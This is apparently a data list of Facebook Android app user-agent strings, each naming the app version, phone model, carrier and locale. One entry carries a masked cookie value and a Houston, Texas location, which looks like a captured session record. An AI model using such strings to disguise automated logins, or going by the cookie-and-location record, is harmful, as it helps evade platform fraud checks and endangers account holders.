"[FBAN/FB4A;FBAV/312.0.0.45.117;FBBV/281505406;FBDM/{density=2.625,width=1080,height=2047};FBLC/de_DE;FBRV/283390339;FBCR/o2 - de ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/313.0.0.35.119;FBBV/282998069;FBDM/{density=2.625,width=1080,height=2394};FBLC/de_DE;FBRV/0;FBCR/vodafone.de;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/XQ-AU52;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/312.0.0.45.117;FBBV/281505401;FBDM/{density=1.75,width=720,height=1464};FBLC/de_DE;FBRV/283611169;FBCR/o2-de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A426B;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/312.0.0.45.117;FBBV/281505406;FBDM/{density=2.625,width=1080,height=2131};FBLC/de_DE;FBRV/283564681;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/313.0.0.35.119;FBBV/282997991;FBDM/{density=2.625,width=1080,height=2123};FBLC/ru_RU;FBRV/283809225;FBCR/o2 - de ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N986B;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/313.0.0.35.119;FBBV/282997860;FBDM/{density=2.625,width=1080,height=2042};FBLC/de_DE;FBRV/283878362;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307956;FBDM/{density=3.0,width=1080,height=2168};FBLC/de_DE;FBRV/281289775;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G781B;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307956;FBDM/{density=3.0,width=1080,height=2265};FBLC/de_DE;FBRV/281447487;FBCR/FYVE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VOG-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307956;FBDM/{density=2.625,width=1080,height=2042};FBLC/de_DE;FBRV/282050035;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307932;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/282087781;FBCR/o2 - de ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307932;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/282168420;FBCR/o2-de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A520F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476352;FBDM/{density=3.0,width=1080,height=2139};FBLC/de_DE;FBRV/263054303;FBCR/DeutschlandSIM;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/HRY-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307956;FBDM/{density=4.0,width=1440,height=2807};FBLC/de_DE;FBRV/282087781;FBCR/o2 - de ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N986B;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/312.0.0.45.117;FBBV/281505064;FBDM/{density=4.0,width=1440,height=2560};FBLC/de_DE;FBRV/0;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307956;FBDM/{density=3.0,width=1080,height=2145};FBLC/de_DE;FBRV/282298157;FBCR/o2 - de;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LYA-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=2.625,width=1080,height=2184};FBLC/de_DE;FBRV/279985922;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A415F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533454;FBDM/{density=3.0,width=1080,height=2090};FBLC/de_DE;FBRV/0;FBCR/winSIM;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/JNY-LX1;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533704;FBDM/{density=2.625,width=1080,height=2094};FBLC/de_DE;FBRV/280345073;FBCR/mobilcom-debitel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A750FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533704;FBDM/{density=2.625,width=1080,height=2131};FBLC/de_DE;FBRV/280462961;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533704;FBDM/{density=2.75,width=1080,height=2138};FBLC/de_DE;FBRV/280649971;FBCR/TALKLINE;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi Note 10 Lite;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533704;FBDM/{density=2.625,width=1080,height=2042};FBLC/de_DE;FBRV/280618835;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533704;FBDM/{density=2.625,width=1080,height=2201};FBLC/de_DE;FBRV/280649971;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G985F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533704;FBDM/{density=2.625,width=1080,height=2131};FBLC/de_DE;FBRV/280595527;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307956;FBDM/{density=3.0,width=1080,height=2107};FBLC/de_DE;FBRV/0;FBCR/Telekom.de;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/259886982;FBDM/{density=1.5,width=480,height=888};FBLC/ru_RU;FBRV/261724288;FBCR/Vodafone UA;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO BC2;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273921910;FBDM/{density=2.0,width=720,height=1344};FBLC/es_LA;FBRV/274807707;FBCR/Claro;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto e5 plus;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/315.0.0.39.113;FBBV/285442147;FBDM/{density=2.625,width=1080,height=2137};FBLC/en_US;FBRV/0;FBCR/AT&amp-T;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one zoom;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/290.0.0.44.121;FBBV/248231995;FBDM/{density=2.75,width=1080,height=2150};FBLC/ru_RU;FBRV/249845786;FBCR/elisa EE;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/MI PLAY;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532M Build/MMB29T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824636;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBRV/257684183;FB_FW/2;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G532M;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/315.0.0.47.113;FBBV/285966859;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/287106035;FBCR/ Cell C;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127351;FBDM/{density=1.9125,width=720,height=1400};FBLC/en_US;FBRV/272210345;FBCR/Boost Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g fast;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"Mozilla/5.0 (Linux; Android 9; LM-X320 Build/PKQ1.190522.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36 [FBAN/FB4A;FBAV/274.0.0.11.119;FBBV/218182593;FBDM/{density=2.25,width=720,height=1332};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/Sprint;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-X320;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;] Cookie	943S******************** City	Houston Region	Texas Country	US Site	m.facebook.com",
"[FBAN/FB4A;FBAV/313.0.0.35.119;FBBV/282998037;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/285101639;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/316.0.0.54.116;FBBV/287518913;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBRV/288029470;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/316.0.0.54.116;FBBV/287518899;FBDM/{density=1.7,width=720,height=1198};FBLC/pt_BR;FBRV/288252041;FBCR/VIVO;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G Play;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/316.0.0.54.116;FBBV/287519012;FBDM/{density=2.75,width=1080,height=2134};FBLC/cs_CZ;FBRV/289140577;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/300.0.0.51.129;FBBV/262618549;FBDM/{density=2.0,width=720,height=1470};FBLC/cs_CZ;FBRV/263824964;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/MOA-LX9N;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/316.0.0.54.116;FBBV/287519012;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/289140577;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/316.0.0.54.116;FBBV/287518899;FBDM/{density=1.7,width=720,height=1198};FBLC/pt_BR;FBRV/288728217;FBCR/VIVO;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G Play;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708667;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/289519067;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708667;FBDM/{density=2.625,width=1080,height=2181};FBLC/cs_CZ;FBRV/289674799;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G770F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708631;FBDM/{density=2.75,width=1080,height=2134};FBLC/cs_CZ;FBRV/289674799;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708590;FBDM/{density=2.75,width=1080,height=2134};FBLC/cs_CZ;FBRV/289699883;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708667;FBDM/{density=3.0,width=1080,height=2043};FBLC/cs_CZ;FBRV/290555739;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2 Lite;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708667;FBDM/{density=2.625,width=1080,height=2186};FBLC/cs_CZ;FBRV/290555739;FBCR/Vodafone CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708667;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/290820647;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708395;FBDM/{density=2.75,width=1080,height=2131};FBLC/cs_CZ;FBRV/290794545;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708623;FBDM/{density=2.0,width=720,height=1280};FBLC/cs_CZ;FBRV/290947837;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/318.0.0.39.154;FBBV/290428847;FBDM/{density=3.0,width=1080,height=2139};FBLC/cs_CZ;FBRV/291442388;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/POT-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/318.0.0.39.154;FBBV/290428847;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/291462360;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708631;FBDM/{density=2.75,width=1080,height=2131};FBLC/cs_CZ;FBRV/290947837;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/318.0.0.39.154;FBBV/290427439;FBDM/{density=2.625,width=1080,height=2181};FBLC/cs_CZ;FBRV/291417590;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G770F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/318.0.0.39.154;FBBV/290428495;FBDM/{density=2.625,width=1080,height=2131};FBLC/cs_CZ;FBRV/291404339;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/318.0.0.39.154;FBBV/290428847;FBDM/{density=3.0,width=1080,height=2076};FBLC/cs_CZ;FBRV/291404339;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265245020;FBDM/{density=3.0,width=1080,height=2139};FBLC/cs_CZ;FBRV/268119191;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/POT-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/318.0.0.39.154;FBBV/290428847;FBDM/{density=3.0,width=1080,height=2265};FBLC/cs_CZ;FBRV/291750373;FBCR/O2.CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ELE-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/318.0.0.39.154;FBBV/290428735;FBDM/{density=3.0,width=1080,height=2076};FBLC/cs_CZ;FBRV/291780368;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/318.0.0.39.154;FBBV/290428847;FBDM/{density=3.0,width=1080,height=2110};FBLC/cs_CZ;FBRV/291288551;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A405FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/312.0.0.45.117;FBBV/281505338;FBDM/{density=4.0,width=1440,height=2392};FBLC/pt_BR;FBRV/0;FBCR/VIVO;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H815;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/315.0.0.47.113;FBBV/285966672;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/0;FBCR/Airtel;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Y2;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/319.0.0.39.120;FBBV/292233360;FBDM/{density=3.0,width=1080,height=2129};FBLC/cs_CZ;FBRV/293535360;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9 SE;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/319.0.0.39.120;FBBV/292233374;FBDM/{density=2.0,width=720,height=1280};FBLC/cs_CZ;FBRV/293535360;FBCR/Vodafone CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G398FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/318.0.0.39.154;FBBV/290428847;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/292674890;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/319.0.0.39.120;FBBV/292233179;FBDM/{density=3.0,width=1080,height=2016};FBLC/cs_CZ;FBRV/293768997;FBCR/Vodafone CZ;FBMF/CUBOT;FBBD/CUBOT;FBPN/com.facebook.katana;FBDV/CUBOT_X18_Plus;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/319.0.0.39.120;FBBV/292233354;FBDM/{density=2.0,width=720,height=1280};FBLC/cs_CZ;FBRV/294006825;FBCR/O2 Family;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/291.0.0.44.120;FBBV/249604787;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/0;FBCR/Vi India;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J200G;FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/318.0.0.39.154;FBBV/290428847;FBDM/{density=2.75,width=1080,height=2175};FBLC/en_US;FBRV/292227784;FBCR/Vi India;FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/POCO X2;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906223;FBDM/{density=3.0,width=1080,height=2128};FBLC/nl_NL;FBRV/295413075;FBCR/KPN;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/INE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/319.0.0.39.120;FBBV/292233371;FBDM/{density=2.8125,width=1080,height=2162};FBLC/en_US;FBRV/293841615;FBCR/Jio 4G;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/LE2101;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401182;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/274073372;FBCR/Jio 4G;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2015;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533659;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/0;FBCR/Ufone;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(6) play;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906272;FBDM/{density=2.75,width=1080,height=2168};FBLC/cs_CZ;FBRV/296240860;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/321.0.0.37.119;FBBV/295906704;FBDM/{density=2.625,width=1080,height=2186};FBLC/cs_CZ;FBRV/0;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444719;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto E (4) Plus;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906272;FBDM/{density=3.0,width=1080,height=2110};FBLC/cs_CZ;FBRV/296240860;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A405FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708623;FBDM/{density=2.0,width=720,height=1358};FBLC/sk_SK;FBRV/0;FBCR/Telekom SK;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ATU-L21;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/321.0.0.37.119;FBBV/295907005;FBDM/{density=2.75,width=1080,height=2131};FBLC/cs_CZ;FBRV/297134789;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265245014;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBRV/265610826;FBCR/UNEFON;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/ALE-L23;FBSV/5.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi",
"[FBAN/FB4A;FBAV/321.0.0.37.119;FBBV/295907003;FBDM/{density=1.75,width=720,height=1423};FBLC/en_US;FBRV/297002318;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/322.0.0.35.121;FBBV/297186794;FBDM/{density=2.0,width=720,height=1358};FBLC/cs_CZ;FBRV/298245798;FBCR/O2.CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ATU-L31;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/322.0.0.35.121;FBBV/297186817;FBDM/{density=2.75,width=1080,height=2068};FBLC/cs_CZ;FBRV/298277803;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/321.0.0.37.119;FBBV/295907005;FBDM/{density=3.0,width=1080,height=2107};FBLC/cs_CZ;FBRV/297807842;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/322.0.0.35.121;FBBV/297186817;FBDM/{density=3.0,width=1080,height=2060};FBLC/cs_CZ;FBRV/298372585;FBCR/O2.CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/322.0.0.35.121;FBBV/297186795;FBDM/{density=3.0,width=1080,height=2102};FBLC/cs_CZ;FBRV/298388802;FBCR/T-Mobile CZ;FBMF/Lenovo;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo L58041;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/322.0.0.35.121;FBBV/297186844;FBDM/{density=1.75,width=720,height=1382};FBLC/cs_CZ;FBRV/298524357;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A105FN;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
